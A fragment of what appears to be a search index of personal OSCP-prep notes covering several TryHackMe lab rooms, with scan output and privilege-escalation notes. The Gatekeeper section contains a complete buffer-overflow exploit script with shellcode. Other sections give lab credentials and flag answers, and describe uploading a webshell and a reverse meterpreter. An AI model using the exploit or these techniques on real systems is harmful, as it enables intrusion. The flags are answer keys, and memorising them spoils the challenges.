.\\Users\\*\n        dw--w--w--                0 Thu May 14 20:57:08 2020    .\n        dw--w--w--                0 Thu May 14 20:57:08 2020    ..\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Default\n        fr--r--r--              174 Tue Apr 21 22:18:13 2020    desktop.ini\n        dr--r--r--                0 Thu May 14 20:58:07 2020    Share\n        .\\Users\\Default\\*\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    .\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    AppData\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Desktop\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Documents\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Downloads\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Favorites\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Links\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Music\n        fr--r--r--           262144 Tue Apr 21 22:18:13 2020    NTUSER.DAT\n        fr--r--r--             1024 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG\n        fr--r--r--           189440 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG1\n        fr--r--r--                0 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG2\n        fr--r--r--            65536 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf\n        fr--r--r--           524288 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms\n        fr--r--r--           524288 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Pictures\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Saved Games\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Videos\n        .\\Users\\Default\\AppData\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Local\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Roaming\n        .\\Users\\Default\\AppData\\Local\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Microsoft\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Temp\n        .\\Users\\Default\\AppData\\Local\\Microsoft\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Windows\n        .\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    GameExplorer\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    History\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Temporary Internet Files\n        .\\Users\\Default\\AppData\\Roaming\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Media Center Programs\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Microsoft\n        .\\Users\\Default\\AppData\\Roaming\\Microsoft\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Internet Explorer\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Windows\n        .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Internet Explorer\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Quick Launch\n        .\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\*\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Cookies\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Network Shortcuts\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Printer Shortcuts\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Recent\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    SendTo\n        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Start Menu\n        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Templates\n        .\\Users\\Share\\*\n        dr--r--r--                0 Thu May 14 20:58:07 2020    .\n        dr--r--r--                0 Thu May 14 20:58:07 2020    ..\n        fr--r--r--            13312 Thu May 14 20:58:07 2020    gatekeeper.exe\n</code></pre> <p>It looks like we found the gatekeeper. Guess I'll get to use the Windows 11 dev box again.</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#exploit-development","title":"Exploit development","text":"<p>I moved the file over to my dev box and fired it up in the debugger. Exploit development went well. No suprises and the script made everything easy.</p> <p>Here's the completed POC</p> <pre><code>#!/usr/bin/env python3\n\nimport socket\n\nip = \"192.168.1.104\"\nport = 31337\n\nprefix = \" \"\noffset = 145\noverflow = \"A\" * offset\nretn = \"\\xc3\\x14\\x04\\x08\"\npadding = \"\\x90\" * 16\npayload = \"\\xba\\x43\\xa3\\x7c\\x5b\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\\x52\\x31\\x56\\x12\\x83\\xc6\\x04\\x03\\x15\\xad\\x9e\\xae\\x65\\x59\\xdc\\x51\\x95\\x9a\\x81\\xd8\\x70\\xab\\x81\\xbf\\xf1\\x9c\\x31\\xcb\\x57\\x11\\xb9\\x99\\x43\\xa2\\xcf\\x35\\x64\\x03\\x65\\x60\\x4b\\x94\\xd6\\x50\\xca\\x16\\x25\\x85\\x2c\\x26\\xe6\\xd8\\x2d\\x6f\\x1b\\x10\\x7f\\x38\\x57\\x87\\x6f\\x4d\\x2d\\x14\\x04\\x1d\\xa3\\x1c\\xf9\\xd6\\xc2\\x0d\\xac\\x6d\\x9d\\x8d\\x4f\\xa1\\x95\\x87\\x57\\xa6\\x90\\x5e\\xec\\x1c\\x6e\\x61\\x24\\x6d\\x8f\\xce\\x09\\x41\\x62\\x0e\\x4e\\x66\\x9d\\x65\\xa6\\x94\\x20\\x7e\\x7d\\xe6\\xfe\\x0b\\x65\\x40\\x74\\xab\\x41\\x70\\x59\\x2a\\x02\\x7e\\x16\\x38\\x4c\\x63\\xa9\\xed\\xe7\\x9f\\x22\\x10\\x27\\x16\\x70\\x37\\xe3\\x72\\x22\\x56\\xb2\\xde\\x85\\x67\\xa4\\x80\\x7a\\xc2\\xaf\\x2d\\x6e\\x7f\\xf2\\x39\\x43\\xb2\\x0c\\xba\\xcb\\xc5\\x7f\\x88\\x54\\x7e\\x17\\xa0\\x1d\\x58\\xe0\\xc7\\x37\\x1c\\x7e\\x36\\xb8\\x5d\\x57\\xfd\\xec\\x0d\\xcf\\xd4\\x8c\\xc5\\x0f\\xd8\\x58\\x49\\x5f\\x76\\x33\\x2a\\x0f\\x36\\xe3\\xc2\\x45\\xb9\\xdc\\xf3\\x66\\x13\\x75\\x99\\x9d\\xf4\\xba\\xf6\\x9c\\x74\\x53\\x05\\x9e\\x65\\xff\\x80\\x78\\xef\\xef\\xc4\\xd3\\x98\\x96\\x4c\\xaf\\x39\\x56\\x5b\\xca\\x7a\\xdc\\x68\\x2b\\x34\\x15\\x04\\x3f\\xa1\\xd5\\x53\\x1d\\x64\\xe9\\x49\\x09\\xea\\x78\\x16\\xc9\\x65\\x61\\x81\\x9e\\x22\\x57\\xd8\\x4a\\xdf\\xce\\x72\\x68\\x22\\x96\\xbd\\x28\\xf9\\x6b\\x43\\xb1\\x8c\\xd0\\x67\\xa1\\x48\\xd8\\x23\\x95\\x04\\x8f\\xfd\\x43\\xe3\\x79\\x4c\\x3d\\xbd\\xd6\\x06\\xa9\\x38\\x15\\x99\\xaf\\x44\\x70\\x6f\\x4f\\xf4\\x2d\\x36\\x70\\x39\\xba\\xbe\\x09\\x27\\x5a\\x40\\xc0\\xe3\\x7a\\xa3\\xc0\\x19\\x13\\x7a\\x81\\xa3\\x7e\\x7d\\x7c\\xe7\\x86\\xfe\\x74\\x98\\x7c\\x1e\\xfd\\x9d\\x39\\x98\\xee\\xef\\x52\\x4d\\x10\\x43\\x52\\x44;\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#exploit","title":"Exploit","text":"<p>I created a new payload and adjusted the POC to match the actual target and it worked! I got a shell as the user <code>natbat</code>. No special privileges. This is a pretty old version of windows, I could probably find a privesc vulnerability relatively easy.</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#windows-exploit-suggester","title":"Windows Exploit Suggester","text":"<p>I exfiltrated a copy of <code>systeminfo</code> and passed it to <code>windows-exploit-suggester.py</code></p> <p>Then I used some grep magic to search for privesc.</p> <pre><code>cat exploitSuggester | grep Priv | grep -E \"^MS..-...\"\n</code></pre> <p>MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important</p> <p>MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important</p> <p>MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important</p> <p>MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important</p> <p>MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important</p> <p>MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#winpeas","title":"WinPEAS","text":"<p>I used <code>WinPEAS.bat</code> to enumerate from the inside.</p> <p>I keep seeing references to firefox on the target. </p> <p>WinPEAS also didn't see patches for many vulnerabilities on this machine.</p> <p>The smb <code>Users</code> share is at <code>C:\\Users\\</code></p> <p>Hostname: Gatekeeper</p> <p>The Firewall is up and running a Standard profile.</p> <p>Allowed programs configuration for Standard profile:                              Mode     Traffic direction    Name / Program                                            Enable   Inbound              dostackbufferoverflowgood.exe / C:\\users\\mayor\\desktop\\dostackbufferoverflowgood.exe</p> <p>There seems to be some file <code>dostackbufferoverflowgood.exe</code>. I did see one internal port running...</p> <p>Found 2 ports that are open internally only:</p> <p>UDP    127.0.0.1:1900         :                                    2200   UDP    127.0.0.1:57514        :                                    2200</p> <p>Couldn't set up port forwarding because I'm not admin.</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#beware-of-fire","title":"Beware of fire","text":"<p>It's been a few days since I gained initial access to this box. I was thinking tonight about the clues on this box and was trying to figure out what this meant:</p> <p>there's fire on the other side.</p> <p>There were some ports that were only available on localhost, so in a sense that would be like a firewall. I thought this was the fire. Tonight I really wanted to dig in and see if this \"fire on the other side\" was a firewall or something else. As I was reviewing the software I remembered Firefox is instlled on this one. I remember seeing a *.lnk file right next to the user.txt.</p> <p>I think I brushed this off initially as a \"too-obvious\" rabbit-hole type of trap...but maybe the answer was staring me in the face the whole time.</p>"},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/","title":"Mr. Robot","text":""},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#scanning","title":"Scanning","text":"<p>Ran nmap quick scan</p> <pre><code>sudo nmap -sS -F -T5 10.10.31.9\n</code></pre> <p> Two ports are open (80,443) which are running webservers. One port is closed (22) which is running ssh.</p>"},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#webserver-on-80","title":"Webserver on 80","text":"<p>The front end is similar to a flash video game. You can enter different commands which each display some content. I examined the startup video closely, there don't appear to be any flags in there.</p>"},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#robotstxt","title":"Robots.txt","text":"<p> Get each Robots.txt page  key-1-of-3.txt</p> <pre><code>073403c8a58a1f80d943455fb30724b9\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#hint-2","title":"Hint 2","text":"<p> I quickly examined the startup video...nothing there. From checking CSS it appears there's a footer with white text that appears when you hover it.</p>"},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#wordpress-version-431","title":"WordPress - Version 4.3.1","text":""},{"location":"OSCP-Prep/TryHackMe/Mr%20Robot/#theme-twentyfifteen","title":"Theme twentyfifteen","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/","title":"Skynet","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#recon","title":"Recon","text":"<p>The room is terminator themed.</p> <p>There is a user named Miles and we need to figure out his email password.</p> <p>There is a hidden directory</p> <p>File inclusion is mentioned.</p>"},{"location":"OSCP-Prep/TryHackMe/Skynet/#port-scan","title":"Port Scan","text":"<pre><code>PORT    STATE SERVICE     REASON         VERSION\n22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))\n110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d\n139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp open  imap        syn-ack ttl 61 Dovecot imapd\n445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\nAggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Skynet/#enumeration","title":"Enumeration","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#22-openssh-72p2","title":"22: OpenSSH 7.2p2","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#80-apache-2418-squirrelmail-1423","title":"80: Apache 2.4.18 - SquirrelMail 1.4.23","text":"<p>  Each login attempt on Squirrel Mail takes 4+ seconds - not viable for a bruteforce.</p>"},{"location":"OSCP-Prep/TryHackMe/Skynet/#110-dovecot-pop3d","title":"110: Dovecot pop3d","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#139-samba-smbd-4311-ubuntu","title":"139: Samba smbd 4.3.11-Ubuntu","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#143-dovecot-imapd","title":"143: Dovecot imapd","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#445-samba-4311","title":"445: Samba 4.3.11","text":""},{"location":"OSCP-Prep/TryHackMe/Skynet/#gaining-access","title":"Gaining access","text":"<p>Connected to anonymous Samba share on 139 using Anonymous Log1.txt contains what appear to be passwords. The first one listed is Miles' login for squirrelmail username:<code>milesdyson</code> password:<code>cyborg007haloterminator</code></p>"},{"location":"OSCP-Prep/TryHackMe/Skynet/#miles-smb-password-is-in-email","title":"Miles' SMB password is in email.","text":"<pre><code>)s{A&amp;2Z=F^n_E.B`\n</code></pre> <p>Connected to Miles' SMB share, in the folder Notes there is a file important.txt with contents: </p> <pre><code>/45kra24zxs28v3yd\n</code></pre> <p>another directory! version 1.4.23 is vulnerable to RFI.</p>"},{"location":"OSCP-Prep/TryHackMe/Skynet/#weaponization","title":"Weaponization","text":"<p>Couldn't figure out what to do next.</p> <p>Found there was an exploit for cuppa CMS - RFI and LFI</p> <p>Turned to writeup to see that the next step was to use RFI on the Cuppa CMS page.</p> <p>Got webshell</p> <p>Moved to a reverse meterpreter (more compatible with privesc modules in metasploit</p> <p>linux/local/ufo_privilege_escalation worked to get root</p> <p><code>3f0372db24753accc7179a282cd6a949</code></p>"},{"location":"OSCP-Prep/TryHackMe/Vulnnet%20Roasted/","title":"Vulnnet Roasted","text":""},{"location":"OSCP-Prep/TryHackMe/Vulnnet%20Roasted/#port-scan","title":"Port scan","text":"<pre><code>PORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2022-02-21 18:42:23Z)\n135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds? syn-ack ttl 125\n464/tcp   open  kpasswd5?     syn-ack ttl 125\n593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 125\n3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 125\n5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing\n49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n49676/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n49683/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n49699/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\n</code></pre> <p>Found the host name: <code>vulnnet-rst.local0</code></p>"},{"location":"OSCP-Prep/TryHackMe/Vulnversity/","title":"Vulnversity","text":""},{"location":"OSCP-Prep/TryHackMe/Vulnversity/#port-3333-looks-promising","title":"Port 3333 looks promising","text":""},{"location":"OSCP-Prep/TryHackMe/Vulnversity/#suid-binaries","title":"SUID binaries","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/","title":"Hackpark","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/#recon","title":"Recon","text":"<p>The intro mentions</p> <ul> <li>Brute Forcing logins</li> <li>Priv Esc Windows</li> <li>Ping is off</li> </ul>"},{"location":"OSCP-Prep/TryHackMe/hackpark/#scanning","title":"Scanning","text":"<p>Since ping is off, we will need to use the -Pn flag. <code>nmap -PnV -T5 10.10.38.171</code></p> <p></p>"},{"location":"OSCP-Prep/TryHackMe/hackpark/#web-server-80","title":"Web Server :80","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/#browser","title":"Browser","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/#whatweb-scan","title":"Whatweb scan","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/#wappalyzer-addon","title":"Wappalyzer addon","text":""},{"location":"OSCP-Prep/TryHackMe/hackpark/#plan","title":"Plan","text":"<ul> <li>[x] Need to find a login page     /admin</li> <li>[x] Brute force login page to get greds     admin:1qaz2wsx</li> <li>[x] Log in</li> </ul> <p>After logging in, can view the framework/version </p> <p><code>Searchsploit blogengine 3.3.6</code> </p> <p><code>searchsploit -m 46353</code> The found exploit uses CVE-2019-6714 Update line 51 with IP and PORT of listener on attack box.  Next steps  Initial Foothold </p>"},{"location":"OSCP-Prep/TryHackMe/hackpark/#enumeration","title":"Enumeration","text":"<p>SystemInfo </p> <p>Users </p>"},{"location":"OSCP-Prep/TryHackMe/hackpark/#exploit","title":"Exploit","text":"<p>Uploaded a reverse meterpreter using the same method as 46353.cs  Set up a listener to catch the reverse meterpreter. <code>msfconsole</code> <code>run</code></p> <p>Then back on the iis apppool\\blog shell, run the uploaded code. Had to find the upload location  Navagate to the proper directory then run the code   We got a reverse shell, though the user is still Blog.</p> <p>  WinPEAS seems to think we can use this autorun to run binaries. What's the file though...</p> <p>user flag: <code>759bd8af507517bcfaede78a21a73e39</code></p> <p>root flag: <code>7e13d97f05f7ceb9881a3eb3d78d3e72</code></p>"},{"location":"OSCP-Prep/TryHackMe/internal/","title":"Internal","text":""},{"location":"OSCP-Prep/TryHackMe/internal/#recon","title":"Recon","text":"<p>The intro mentions</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#flags","title":"Flags","text":"<pre><code>- User.txt\n- Root.txt\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#rules","title":"Rules","text":"<pre><code>- Modify hosts file to reflect internal.thm\n- All tools/techniques are allowed.\n- Locate and note all vulnerabilites on the machine.\n- Submit flags to dashboard.\n- Stay in scope - this IP only.\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#service-enumeration","title":"Service Enumeration","text":"<pre><code>\u2514\u2500$ nmap -sV -T5 10.10.123.49 | tee quickscan\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:30 CDT\nNmap scan report for 10.10.123.49\nHost is up (0.20s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.26 seconds\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#openssh-76p1","title":"OpenSSH 7.6p1","text":"<p>Possible Username Enumeration </p> <p>User <code>aubreanna</code> Try to brute force.</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#apache-2429-ubuntu","title":"Apache 2.4.29 (ubuntu)","text":"<p>Possible RCE and PrivEsc </p>"},{"location":"OSCP-Prep/TryHackMe/internal/#webserver","title":"WebServer","text":"<p>Default Apache frontpage. </p>"},{"location":"OSCP-Prep/TryHackMe/internal/#feroxbuster","title":"Feroxbuster","text":"<p>Ran another Feroxbuster for /blog</p> <pre><code>200       83l      284w     4530c http://internal.thm/blog/wp-login.php\n200      328l     3640w        0c http://internal.thm/blog/\n200       97l      823w     7278c http://internal.thm/blog/readme.html\n200        5l       15w      135c http://internal.thm/blog/wp-trackback.php\n200      384l     3177w    19915c http://internal.thm/blog/license.txt\n200        0l        0w        0c http://internal.thm/blog/wp-config.php\n200        0l        0w        0c http://internal.thm/blog/wp-cron.php\n200        0l        0w        0c http://internal.thm/blog/wp-blog-header.php\n200       11l       23w      223c http://internal.thm/blog/wp-links-opml.php\n200        0l        0w        0c http://internal.thm/blog/wp-load.php\n\n301        9l       28w      320c http://internal.thm/blog/wp-admin\n301        0l        0w        0c http://internal.thm/blog/index.php\n301        9l       28w      323c http://internal.thm/blog/wp-includes\n301        9l       28w      322c http://internal.thm/blog/wp-content\n302        0l        0w        0c http://internal.thm/blog/wp-signup.php\n302        0l        0w        0c http://internal.thm/blog/wp-activate.php\n\n500        0l        0w        0c http://internal.thm/blog/wp-settings.php\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#php-gotta-be-higher-than-5620-per-phpmyadmin","title":"PHP (gotta be higher than 5.6.20 per phpMyAdmin)","text":""},{"location":"OSCP-Prep/TryHackMe/internal/#phpmyadmin-466","title":"phpMyAdmin 4.6.6","text":"<p>Login Page  FeroxBuster</p> <pre><code>$ feroxbuster -u http://internal.thm:80/phpmyadmin/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/tryhackme/boxes/active/internal/results/scans/tcp80/tcp_80_http_phpmyadmin_feroxbuster_raft-large-words.txt\"\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html\n403        9l       28w      277c http://internal.thm/phpmyadmin/.php\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.txt\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.html\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.php\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.asp\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.aspx\n403        9l       28w      277c http://internal.thm/phpmyadmin/.html.jsp\n403        9l       28w      277c http://internal.thm/phpmyadmin/templates\n301        9l       28w      324c http://internal.thm/phpmyadmin/themes\n301        9l       28w      320c http://internal.thm/phpmyadmin/js\n200       26l      359w        0c http://internal.thm/phpmyadmin/index.php\n200       26l      359w        0c http://internal.thm/phpmyadmin/themes.php\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm\n403        9l       28w      277c http://internal.thm/phpmyadmin/libraries\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.txt\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.html\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.php\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.asp\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.aspx\n403        9l       28w      277c http://internal.thm/phpmyadmin/.htm.jsp\n200       26l      359w        0c http://internal.thm/phpmyadmin/logout.php\n</code></pre> <ul> <li>[ ] Brute Force</li> </ul>"},{"location":"OSCP-Prep/TryHackMe/internal/#wordpress-542","title":"Wordpress 5.4.2","text":"<p><code>$ wpscan http://internal.thm:80/blog/ -o wpscan</code> Results</p> <pre><code>[+] URL: http://internal.thm/blog/ [10.10.41.223]\n[+] Started: Sat Nov  6 13:22:11 2021\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://internal.thm/blog/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;\n |  - http://internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/\n | Last Updated: 2021-07-22T00:00:00.000Z\n | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt\n | [!] The version is out of date, the latest version is 2.8\n | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'\n\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#xml-rpc","title":"XML-RPC","text":"<pre><code>----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                             |  Path\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nCuckoo Sandbox Guest 2.0.1 - XMLRPC Privileged Remote Code Execution                                                                                       | windows/remote/40043.py\nMovable Type 7 r.5002 - XMLRPC API OS Command Injection (Metasploit)                                                                                       | cgi/webapps/50464.rb\nPHP 5.3.2 'xmlrpc' Extension - Multiple Remote Denial of Service Vulnerabilities                                                                           | php/dos/33755.php\nPHPXMLRPC &lt; 1.1 - Remote Code Execution                                                                                                                    | php/webapps/43829.txt\nSonicWall Global Management System - XMLRPC set_time_zone Command Injection (Metasploit)                                                                   | 